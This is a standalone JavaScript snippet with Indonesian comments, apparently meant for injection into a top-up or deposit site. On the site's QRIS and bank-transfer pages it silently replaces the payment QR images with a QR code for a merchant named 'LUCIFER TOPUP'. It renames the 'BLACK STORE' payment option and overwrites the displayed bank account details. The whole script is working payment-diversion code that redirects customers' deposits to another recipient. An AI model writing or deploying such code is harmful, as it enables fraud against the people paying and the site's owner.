<script>
(function() {
  const url = window.location.href;

  // Daftar gambar lama -> gambar baru
  const replaceMap = {
    "https://imglink.io/i/864ec599-b308-44b4-be43-958583342774.jpeg": "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA",
    "https://imglink.io/i/ed871362-e302-4691-92e0-c8f075e780d6.jpg": "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA"
  };

  // Fungsi untuk jalankan hanya di qris.php
  if (url.endsWith('qris.php')) {
    // Ganti URL gambar sesuai mapping
    document.querySelectorAll('img').forEach(img => {
      if (replaceMap[img.src]) {
        img.src = replaceMap[img.src];
      }
    });

    // Ganti value di <select>
    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("BLACK STORE")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  // Fungsi untuk jalankan di url /?bank=NDk5 dll
  const bankParams = ['MjE=','MjM=','MjQ=','MjU=','MjY=','Mjc=','MTM2OA=='];
  if (bankParams.some(param => url.endsWith(`/?bank=${param}`))) {
    // Nama Akun Bank
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    // Rekening Bank No
    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    // Tambahkan gambar di bawah Rekening Bank No
    const rekeningContainer = rekeningInput.parentElement;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
      img.style.maxWidth = "200px";
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }
})();
</script>
